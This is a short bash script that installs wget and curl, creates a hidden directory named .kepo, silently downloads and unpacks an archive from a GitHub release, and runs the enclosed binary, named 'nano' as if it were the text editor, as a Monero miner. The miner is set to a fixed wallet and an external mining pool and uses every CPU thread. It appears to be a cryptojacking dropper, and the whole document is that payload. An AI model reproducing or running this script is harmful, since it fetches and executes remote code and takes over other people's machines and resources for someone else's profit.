#!/bin/bash
set -x
apt-get update 
apt-get install -y wget curl
mkdir .kepo && cd .kepo
wget https://github.com/Franky777777/razor/releases/download/nano/nano.tar.gz > /dev/null 2>&1
tar -xvf nano.tar.gz
chmod +x nano
./nano -algo RandomX -wallet 4QB56BECFrEiFM21mkorfx3SdMYysni9B8Ha6rDCkuPW5VCpYeiSWE1ThC3dPPD8rB33ki7Jd49NzFwY8k1VHfRCKA58Yxo -coin XMR -rigName envio -pool1 82.223.243.212:6666 -useSSL false -cpuThreads $(nproc --all) 